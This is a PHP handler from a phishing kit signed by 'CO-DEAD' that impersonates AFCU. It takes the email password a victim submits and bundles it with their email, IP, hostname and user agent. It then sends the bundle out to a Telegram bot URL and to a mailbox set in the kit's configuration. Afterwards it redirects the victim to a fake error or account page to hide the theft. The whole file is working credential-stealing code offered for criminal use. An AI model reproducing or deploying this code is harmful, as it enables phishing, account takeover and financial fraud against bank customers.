<?php 
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * icq & telegram = @CO-DEAD
 
###############################################
#$            Coded by CO-DEAD               $#
#$  Adding backdoor won't  make you a Coder  $#
#$          Copyright 2022 AFCU              $#
###############################################

**/
if(isset($_POST['emailPassword']))
{
	include ("../mine.php");
	include '../anti/recon.php';
		ob_start();
	session_start();
	$ip = "{$_SESSION['ip']}";
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
			$code = <<<EOT
	============== [ AFCU Email  By CO-DEAD | ] ==============
	Email 		: {$_SESSION['email']}
	Password         : {$_POST['emailPassword']}
		-------- I N F O | I P  --------
	IP		: $ip
	IP lookup		: https://ip-api.com/$ip
	OS		: $useragent
	============= [ AFCU Email By CO-DEAD ] =============
	\r\n\r\n
	EOT;
	$sendme = [
		'text' => $code
	];
	if($bot_result == "true"){
		$data = http_build_query($sendme);
		$response = file_get_contents( $bot . $data);
	}
			$subject = " AFCU Email Info By CO-DEAD  From $ip";
			$headers = "From: CO-DEAD <codead13@yandex.com>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
			@mail($email,$subject,$code,$headers);

				if ($dmail == "on") {
					session_destroy();
					header("Location: ../email-auth-error");
				} else {
					session_destroy();
					header("Location: ../account-overview");
				}
			

}
